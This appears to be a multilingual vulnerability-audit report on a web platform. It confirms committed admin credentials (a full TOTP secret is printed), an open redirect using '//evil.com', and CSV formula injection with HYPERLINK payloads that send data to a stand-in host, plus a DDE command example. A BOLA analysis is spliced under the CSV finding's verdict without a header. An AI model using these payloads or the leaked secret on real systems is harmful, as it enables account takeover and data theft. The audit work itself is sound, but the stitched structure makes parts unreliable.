## F-001 — ✅ TRUE POSITIVE · severità-vuln Critical

**Restated claim**: The e2e seeder db/scripts/seed-test-admin.ts commits both authentication factors for the internet-facing PLATFORM_ADMIN account admin@heuresys.com into a PUBLIC GitHub repo: (1) a hardcoded default password DEFAULT_PASSWORD="«rotated-2026-07-04»" (line 48, applied at :179/:199 when TEST_ADMIN_PASSWORD is unset), and (2) a VERIFIED TOTP second factor whose base32 secret E2EFIXADMIN2HEURESYS2TOTP2AAAAAA is committed in apps/api/test/helpers/mfa-fixture-secrets.ts:23 and inserted with auth_mfa_factor_verified=true by ensureTotpFactor (:85-101). Because both factors are public and the platform stores/verifies the TOTP secret in plaintext base32, mandatory MFA provides zero protection and any anonymous internet reader can fully authenticate as platform admin.

**Bug class**: Hardcoded/committed credentials — use of hard-coded password + hard-coded MFA secret (CWE-798), resulting in complete authentication bypass / account takeover of the highest-privilege account.

**Threat model**: Code privilege: the seeder writes a LOCAL identity, a current ARGON2ID credential, and a VERIFIED TOTP factor for admin@heuresys.com (PLATFORM_ADMIN, top native privilege). Attacker BEFORE the bug: an unauthenticated, anonymous internet user who can read the public repo (github.com/Spen-Zosky/heuresys-advanced, confirmed PUBLIC) and reach the public login surface at https://www.heuresys.com. Attack surface: fully public/unauthenticated — no prior access, credential, or foothold required. The bug hands the attacker both factors of a mandatory-MFA-protected admin login.

**Fase 1 — Data flow / trust boundaries / API contracts / env protections**: Source: two committed constants — seed-test-admin.ts:48 DEFAULT_PASSWORD and mfa-fixture-secrets.ts:23 FIXTURE_TOTP_SECRETS['admin@heuresys.com']. Flow: main() (:179) sets password = TEST_ADMIN_PASSWORD ?? DEFAULT_PASSWORD; ensureAuth (:163-171) argon2-hashes it into sys.sys_auth_credentials as the current credential; ensureTotpFactor (:88-100) inserts the base32 secret into sys.sys_auth_mfa_factors with auth_mfa_factor_verified=true and metadata.label='e2e-fixture'. Sink at login: mfa-service.ts verifyTotpCode (:155-158) builds an OTPAuth.TOTP from OTPAuth.Secret.fromBase32(secretBase32) and validate()s the submitted code; password gate uses argon2 verify. Trust boundaries crossed: repo->attacker (public), attacker->prod login. Validation/sanitization present: TEST_ADMIN_PASSWORD env override (password only), TEST_ADMIN_RESET_PASSWORD flag, idempotency guards. ## F-002 — ✅ TRUE POSITIVE · severità-vuln Medium

**Restated claim**: The login page reads the `next` query parameter from the URL and, after a successful authentication, redirects the browser to that value using Next.js `router.replace`. The only guard is `next.startsWith("/")` (page.tsx:27), which admits protocol-relative values like `//evil.com` and backslash variants `/\evil.com`. Because `/login` is a public route and the value is re-read directly from `window.location.search` (not from the trusted proxy write-path), an attacker who sends a victim `https://<app>/login?next=//evil.com` causes a cross-origin redirect to an attacker site immediately after the victim legitimately authenticates — an open redirect (CWE-601).

**Bug class**: Open Redirect / URL redirection to untrusted site (CWE-601)

**Threat model**: Code privilege: client-side React login page running on the trusted app origin, executing a navigation. Attacker capability BEFORE the bug: an unauthenticated remote attacker who can craft a URL and deliver it to a victim (phishing email, chat, link) — no prior access, no auth. Attack surface: fully public, unauthenticated route (`/login` in PUBLIC_PATHS) with arbitrary attacker-controlled query string. The victim is a legitimate user who authenticates on the real origin; the malicious redirect executes under the trust of the genuine login flow.

**Fase 1 — Data flow / trust boundaries / API contracts / env protections**: SOURCE: `window.location.search` `next` param (page.tsx:26), fully attacker-controlled on the public `/login` route. VALIDATION between source and sink: exactly one check — `next && next.startsWith("/")` (page.tsx:27). No `//` exclusion, no backslash exclusion, no `new URL()` same-origin assertion, no allowlist. SINK: `router.replace(dest)` (page.tsx:95) via `useRouter` from `next/navigation` (line 4, no wrapper). TRUST BOUNDARY: the crafted URL query crosses from attacker into the app at page load. Note the proxy write-path (proxy.ts:31) only ever sets `next` to an internal `pathname` and is benign — but it is irrelevant because `readNextParam()` re-parses the live URL, so the attacker path never touches the proxy. ENVIRONMENTAL PROTECTION: none — Next.js 16.2.9 app-router `router.replace` resolves `//evil.com` through `new URL()` to a different origin and performs a hard (MPA) navigation rather than blocking it; this is the documented, non-mitigated behavior, so the framework does not prevent the redirect.

**Fase 2 — Exploitability (attacker control / math bounds / race)**: Attacker control proven: the value reaching the sink originates verbatim from the URL query the attacker authored; it is NOT internal storage set by a trusted component. String algebra of the guard: `"//evil.com".startsWith("/")` === true and `"/\\evil.com".startsWith("/")` === true, so both bypass the single filter. Origin resolution: `new URL("//evil.com", "https://app-origin")` yields origin `https://evil.com` ≠ app origin, which the app-router turns into a cross-origin hard navigation. No race involved (N/A). No API bounds intercede (react-hook-form/zod validate only email+password, not the redirect). Precondition: the victim completes a legitimate login (any success path — password, MFA, passkey, post-enroll relogin all funnel through `redirectFor`), which is a normal, attacker-independent event once the victim clicks the crafted link.

**Fase 3 — Impact (real vs operational; primary vs defense-in-depth)**: Real security impact: CWE-601 open redirect. After authenticating on the genuine origin the victim is hard-navigated to an attacker-controlled site, enabling convincing phishing / credential re-harvest / malicious-download landing pages that inherit the trust of the real login flow. This is a distinct exploitable vulnerability, not mere robustness/hardening: there is no primary control that still holds — the redirect guard IS the control and it is bypassed. Impact ceiling is correctly bounded: session cookies are HttpOnly + SameSite=Lax, so no session token is leaked to the attacker origin (excludes credential/session theft, hence not High/Critical). Net effect is a Medium open redirect in an auth flow.

**Fase 4 — PoC (pseudocodice + PoC negativo)**: POSITIVE PoC (attack path): (1) Data flow: attacker sets `next=//evil.com` in `https://app/login?next=//evil.com`. (2) Attacker controls: the entire query string on a public route. (3) Trigger: victim clicks link, submits valid credentials; on success `onSubmit`→`redirectFor(res.roles)` runs. `readNextParam()` returns `"//evil.com"` (passes `startsWith("/")`), `dest="//evil.com"`, `router.replace("//evil.com")`. (4) Impact: browser resolves to `https://evil.com` and hard-navigates off-origin. NEGATIVE PoC (preconditions that break it): if the guard were `next.startsWith("/") && !next.startsWith("//") && !next.startsWith("/\\")` (or a `new URL(next, origin)` same-origin assertion) the value would be rejected → no exploit; if Next router treated cross-origin `replace` as a no-op/relative-only navigation the redirect would fail — but v16.2.9 does perform the external navigation; if `/login` were not public or the `next` value came only from the proxy write-path, the attacker could not inject it — but it is public and re-read from the live URL. Executable PoC skipped: running the live SPA is out of read-only scope; the string-algebra + code trace is deterministic and sufficient.

**Fase 5 — Devil's advocate (7Q + 13-item checklist)**: 1) Pattern-matching bias: not blind pattern match — I read the exact guard and sink and traced the source. 2) Trust-boundary confusion: the tainted value is genuinely external (URL query on a public page), NOT trusted internal storage; the benign proxy write-path is a separate, unused code path. 3) Proof rigor: bypass proven by concrete string algebra and URL-origin resolution, not hand-waving. 4) Defense-in-depth vs primary: this is the primary (and only) redirect control, and it fails — not a secondary layer. 5) LLM self-check hallucination: I did not invent the Next behavior generically; it is the well-known app-router cross-origin hard-navigation, and I confirmed v16.2.9 with no custom wrapper. 6) Discarding a real vuln for complexity: exploit is trivial (single crafted link), no reason to downplay. 7) Inventing unverified mitigations: I re-read the code — there is no same-origin check, no `//`/backslash exclusion, no allowlist anywhere in `readNextParam`/`redirectFor`; the SameSite=Lax/HttpOnly cookie property is a real bound that I used only to CAP severity, not to dismiss the bug. 13-item FP patterns reviewed: validation-chain (single insufficient check), conditional-logic (guard admits `//`), data-source-trust (external), internal-vs-external (external), API-contract (no bounds), real-vs-theoretical (real, trivially triggerable), defense-in-depth-vs-primary (primary control fails) — none convert this to a false positive.

**Gate review**: 1 Process ✅ PASS · 2 Reachability ✅ PASS · 3 Real-Impact ✅ PASS · 4 PoC-Validation ✅ PASS · 5 Math-Bounds ✅ PASS · 6 Environment ✅ PASS

**VERDETTO — TRUE_POSITIVE**: All applicable gates pass. The `next` value is fully attacker-controlled from the query string of the public `/login` route, flows to `router.replace` guarded only by `startsWith("/")`, which provably admits protocol-relative (`//evil.com`) and backslash (`/\evil.com`) values; Next.js 16.2.9 app-router resolves these to a different origin and performs a real external navigation with no framework mitigation. This is an exploitable CWE-601 open redirect triggered by a single crafted link plus a normal legitimate login — a genuine security vulnerability, not defense-in-depth or robustness. Severity is correctly Medium and not inflated: HttpOnly + SameSite=Lax session cookies prevent token/session theft, capping impact at phishing/credential-reharvest. The memory note labeling it "Critical" overstates; the finding as declared (Medium) is accurate.

## F-004 — ✅ TRUE POSITIVE · severità-vuln Medium

**Restated claim**: The sole CSV cell escaper `csvCell` (analytics/csv.ts:26-30) performs only RFC-4180 quoting (quote/comma/CR/LF) and never neutralizes cells beginning with a spreadsheet-formula trigger character (= + - @, and TAB/CR). Because this exact function is reused by both the analytics multi-section exporter (toCsv) and the generic list exporter listToCsv (serializers.ts:42-43) — which the global onSend hook (hook.ts:79) attaches to every {items,total} GET list route via ?format=csv — attacker-controlled free text lands in CSV cells unmodified. The concrete cross-boundary chain: an unauthenticated external attacker POSTs to the PUBLIC /v1/leads form (routes.ts:18) with e.g. name=`=HYPERLINK("http://evil/?"&A1)`; the value is stored verbatim (service.ts:19-28, schema only trims+bounds length, leads.ts:16-26); a PLATFORM_ADMIN later exports GET /v1/leads?format=csv and opens it, where the formula executes in Excel/Sheets/LibreOffice. This is CSV/Formula Injection (CWE-1236).

**Bug class**: CSV / Spreadsheet Formula Injection (CWE-1236) — output-encoding failure at a CSV serialization sink

**Threat model**: Code privilege: the API serializes list rows to a downloadable CSV that is opened by an authenticated PLATFORM_ADMIN in a desktop spreadsheet client. Before the bug, an unauthenticated remote attacker can only submit a public lead form (rate-limited 5/min, length-bounded, consent-gated). The attacker cannot read leads, cannot authenticate, and cannot touch the export path directly — but they control the free-text stored fields (name/company/role/message) that the privileged admin later exports. Attack surface: unauthenticated public ingress (POST /v1/leads) feeding a privileged-authenticated egress (GET /v1/leads?format=csv). Same pattern applies to ~85 other {items,total} list endpoints carrying attacker-influenced free text (skill names, org-unit names, position titles).

**Fase 1 — Data flow / trust boundaries / API contracts / env protections**: SOURCE: POST /v1/leads body fields name/company/role/message (leads/routes.ts:18-25) — public, unauthenticated. VALIDATION between source and store: LeadCreateSchema (packages/shared/src/schemas/leads.ts:16-26) applies z.string().trim().min/max only. trim() removes leading/trailing whitespace incl. TAB(0x09)/CR(0x0D) — so those two formula-trigger vectors ARE neutralized for leads — but does NOT remove leading '=', '+', '-', '@', which are the primary formula triggers. STORE: service.ts:19-28 passes name/company/role/message straight to repo.insertLead with no transformation. TRUST BOUNDARY 2 (egress): GET /v1/leads (routes.ts:27-31, requirePermission leads:read → PLATFORM_ADMIN) returns {items,total} (LeadListResponseSchema) with the raw stored strings (LeadResponseSchema fields are plain z.string()). SINK: global onSend hook (lib/export/hook.ts:50-87) detects ?format=csv on a 200 application/json {items} response and calls listToCsv (serializers.ts:40-45), which calls csvCell per cell (csv.ts:26-30). csvCell regex `/[",\r/n]/` does NOT include = + - @; a leading-'=' cell with no comma/quote is emitted verbatim. ENVIRONMENTAL PROTECTIONS: none in-app on the CSV path (grep for formula/sanitize/DDE across apps/api/src found no CSV guard). The XLSX branch (serializers.ts:55 via plain()) writes inline string cells through exceljs and does NOT create formulas — genuinely unaffected, matching the finding's own note. So only the CSV branch is vulnerable, and nothing in framework/runtime removes the formula prefix.

**Fase 2 — Exploitability (attacker control / math bounds / race)**: Attacker control over the sink data is direct and complete: the name/company/role/message fields are free-text, only length-bounded (max 200/200/160/2000), and stored verbatim. A payload such as name=`=HYPERLINK("http://evil/?x="&A1&A2)` (61 chars, well under 200) is not whitespace-leading, so trim() leaves it intact; it contains no comma/quote/CR/LF, so csvCell emits it unquoted with the leading '=' preserved. This is NOT internal-trusted storage — it is externally submitted content crossing into a privileged export. Reachability of the export is confirmed: GET /v1/leads returns {items,total} JSON (Array items), method GET, statusCode 200, content-type application/json — satisfying every guard in hook.ts:51-71, so listToCsv runs. No bounds/integer proof needed (not a numeric class). No race involved. The only precondition outside the attacker's control is that a PLATFORM_ADMIN chooses to export CSV and open it in a spreadsheet client — a normal admin workflow that the route doc string explicitly advertises ("CSV/XLSX-exportable").

**Fase 3 — Impact (real vs operational; primary vs defense-in-depth)**: Real security impact, not mere robustness. On open in Excel/LibreOffice/Google Sheets, the '='-prefixed cell is parsed as a formula. Concrete outcomes: (a) info-disclosure/exfiltration via =HYPERLINK (one victim click sends adjacent cell data to attacker URL) or, in Google Sheets, network-fetching functions (=IMAGE/=IMPORTXML/=IMPORTDATA) that can leak cell contents; (b) code execution via legacy DDE (=cmd|'/c calc'!A1) — but only on older Excel and only after the victim clicks through two security warnings, since modern Excel disables DDE by default. This is a recognized OWASP/CWE-1236 vulnerability class where the primary control (neutralizing the formula prefix at serialization) is entirely absent; it is not a defense-in-depth secondary layer. Impact is real but gated on victim client behavior and (for the strongest vectors) user interaction, which is what caps the severity below High.

**Fase 4 — PoC (pseudocodice + PoC negativo)**: POSITIVE PoC (path): 1) Attacker (unauthenticated) → POST /v1/leads {name:"=HYPERLINK(\"https://evil.tld/?d=\"&A1&B1)", company:"x", email:"a@b.co", consent:true}. 2) Server stores name verbatim (service.ts:19-28). 3) PLATFORM_ADMIN → GET /v1/leads?format=csv. 4) hook.ts:79 → listToCsv → csvCell emits the cell as `=HYPERLINK("https://evil.tld/?d="&A1&B1)` unquoted. 5) Admin opens the .csv in Excel/Sheets; on click the HYPERLINK exfiltrates neighbouring lead data (other victims' emails) to evil.tld. NEGATIVE PoC (preconditions that break it): (a) if the admin opens the file in a plain text editor or imports it as text-only, no formula runs; (b) if the admin uses the XLSX export instead of CSV, exceljs writes it as an inline string — no detonation; (c) modern Excel with DDE disabled + user declining the "enable content"/link warning blocks the RCE and click-based exfil variants; (d) a payload starting with whitespace/TAB/CR would be stripped by schema trim(), so only = + - @ survive as leading triggers. Executable PoC skipped: requires a live spreadsheet client to demonstrate detonation (out of read-only scope); the serialization defect is proven by reading csvCell directly.

**Fase 5 — Devil's advocate (7Q + 13-item checklist)**: 1) Pattern-matching bias: not just "no formula escaping" pattern-matched — the actual regex and the full source→sink→export chain were read; the missing chars (= + - @) are provably outside the /[",\r/n]/ set. 2) Trust-boundary confusion: the tainted data genuinely originates outside trust (public form), not internal trusted storage — verified via routes.ts (POST is public, no preHandler auth). 3) Rigour: emission-verbatim proven by the regex; length bound (max 200) shown to accommodate the payload. 4) Defense-in-depth confusion: formula-neutralization IS the primary and only control here; there is no secondary layer failing — its absence is the whole vuln. 5) LLM self-check: I did not hallucinate a mitigation; grep confirmed none exists on the CSV path. 6) Am I discarding a real vuln for complexity? No — I am AFFIRMING it; the chain is simple. 7) Am I inventing unverified mitigations? Checked and rejected: trim() only neutralizes TAB/CR leading vectors (verified), NOT '='; XLSX safety verified in code; no CSP/framework guard applies to a downloaded file. 13-item FP patterns: validation-chain = length/trim only (no formula guard); data-source-trust = external/public (not internal); internal-vs-external = external ingress confirmed; API-contract = no bounds prevent it; real-vs-theoretical = real class but user-interaction-gated (severity, not existence); defense-in-depth-vs-primary = primary control absent; TOCTOU/race = N/A.

**Gate review**: 1 Process ✅ PASS · 2 Reachability ✅ PASS · 3 Real-Impact ✅ PASS · 4 PoC-Validation ✅ PASS · 5 Math-Bounds ➖ N/A · 6 Environment ✅ PASS

**VERDETTO — TRUE_POSITIVE**: All applicable gates pass. **Fase 1 — Data flow / trust boundaries / API contracts / env protections**: Source: req.params.positionId (path, attacker-controlled) → routes.ts:25 preHandler requirePermission("compensation_intelligence:read") → service.getProfileByPosition(actor, positionId) service.ts:33. Validazione tra source e sink: (1) RBAC gate requirePermission blocca chi non ha la permission; (2) service.ts:34-38 findPositionTenantId + check positionTenant===actor.tenantId (tenant-equality, NON org-subtree). Sink: repo.findCompensationProfileByPositionId (repository.ts:44-73) → SELECT su sys_position_compensation_profiles JOIN sys_compensation_bands, ritorna band min/mid/max EUR, economic_weight, reward_gates_applied — dati di POSIZIONE (organizational design, I1), non retribuzione individuale di una persona. getRewardGateDistribution (service.ts:63-66) → getRewardGateStatusDistribution(tenantId) ritorna solo conteggi aggregati per status, zero righe per-utente. Trust boundary primario: RBAC. Il gate org-axis (resolveOrgReadScope, resolver.ts:58-82) e' un controllo secondario che governa "di CHI si leggono i dati person-sensitive" (I18/I20). Verifica contratto: HR_MANDATED_ROLES={TENANT_ADMIN,HRMS_MANAGER} → scope tenant-wide; MANAGERIAL_ROLES={MANAGER,CEO} → subtree; altri → self.

**Fase 2 — Exploitability (attacker control / math bounds / race)**: Controllo attacker sul positionId: SI. Ma la reachability dello scenario "scope-ristretto legge fuori scope" richiede che la permission sia detenuta da un ruolo con scope sub-tree/self. Verifica in sorgente (migration 000005 + 000045) di chi detiene `compensation_intelligence:read` (permission FULL, non :read:self): HRMS_MANAGER (000005:470-473, HR_MANDATED→tenant-wide per mandato), CEO (000045:76-80, MANAGERIAL→subtree), TENANT_ADMIN (holds-all-except-exclusions, HR_MANDATED→tenant-wide), PLATFORM_ADMIN (cross-tenant). Il ruolo MANAGER (000005:496-518) NON detiene `compensation_intelligence:read` (ha solo career/gap/kpi read, no comp); USER detiene solo `compensation_intelligence:read:self` (000005:543). Quindi il "line manager" del claim NON e' raggiungibile: nessun ruolo subtree-scoped diverso da CEO ha la permission. L'unico holder subtree-scoped e' CEO, il cui sub-albero e' per costruzione la cima dell'org → coincide di fatto col tenant intero. Set: {holders della permission} ∩ {ruoli con scope piu' stretto del tenant e sub-tree non-totale} = ∅. Il gap pratico e' nullo.

**Fase 3 — Impact (real vs operational; primary vs defense-in-depth)**: Nessuna info-disclosure oltre lo scope autorizzato: ogni holder attuale ha gia' legittimamente accesso tenant-wide (TENANT_ADMIN, HRMS_MANAGER per mandato I20; PLATFORM_ADMIN cross-tenant) o subtree=tenant (CEO). Inoltre i dati esposti sono position-centric (pay-band della posizione, min/mid/max, economic_weight — I1) e conteggi aggregati, non retribuzione individuale di una persona identificabile: I18 governa dati PERSONAL/COMPENSATION *di persone*, non applicabile qui. L'asimmetria di enforcement e' reale nel codice ma costituisce difesa-in-profondita/coerenza (defense-in-depth), non fallimento del controllo primario (RBAC regge l'entry). Robustezza/coerenza futura, non impatto di sicurezza attuale.

**Fase 4 — PoC (pseudocodice + PoC negativo)**: PoC POSITIVO (ipotetico): attaccante line-manager autenticato → GET /compensation/positions/{positionId_fuori_subtree} → se avesse la permission con scope subtree, service.ts:36 passa (stesso tenant) → riceve pay-band di posizione fuori dal suo ramo. PoC NEGATIVO (precondizioni assenti nel sistema reale): (a) il ruolo MANAGER/line non detiene `compensation_intelligence:read` → requirePermission (routes.ts:25) restituisce 403 PRIMA di service.getProfileByPosition; (b) gli unici holder (TENANT_ADMIN/HRMS_MANAGER/PLATFORM_ADMIN) hanno gia' scope tenant-wide/cross-tenant per mandato → nessun over-read; (c) CEO ha subtree=org intero → nessun dato "fuori scope". Rimossa una qualsiasi di queste, l'exploit fallisce. PoC eseguibile saltato: dimostrazione algebrica di intersezione vuota via set di grant nelle migration e' sufficiente e non richiede DB live.

**Fase 5 — Devil's advocate (7Q + 13-item checklist)**: 1) Pattern-matching bias: l'asimmetria "un path gated, l'altro no" fa scattare l'allarme BOLA, ma il gate mancante e' rilevante solo se un ruolo subtree-scoped detiene la permission — non e' il caso. 2) Trust-boundary confusion: il controllo primario e' RBAC (requirePermission), il gate org-axis e' secondario; il finding scambia il fallimento del secondario per una vuln. 3) Rigore prova: verificato via grant espliciti nelle migration (000005:470,543; 000045:76; MANAGER 496-518 senza la perm) + resolver.ts:44,67 per lo scope dei ruoli holder. 4) Defense-in-depth confusion: SI, e' esattamente questo — aggiungere il gate irrobustirebbe ma la sua assenza non e' sfruttabile. 5) LLM self-check hallucination: le mitigazioni (RBAC, scope tenant-wide degli holder) sono lette dal sorgente reale, non inventate. 6) Sto scartando una vuln reale perche' l'exploit e' complesso? No: l'exploit e' semplice ma la precondizione (ruolo subtree con la permission) non esiste nel RBAC corrente. 7) Sto inventando mitigazioni? No: rilette migration 000005/000045 e resolver.ts. Nota 13-item FP: si applicano data-source-trust (positionId tenant-checked), internal-vs-external (dati position-centric non person-level), real-vs-theoretical impact (over-read solo teorico), defense-in-depth-vs-primary (RBAC primario regge). Residuo: se in futuro `compensation_intelligence:read` venisse concessa a MANAGER, il gate org andrebbe aggiunto — item di hardening/documentazione.
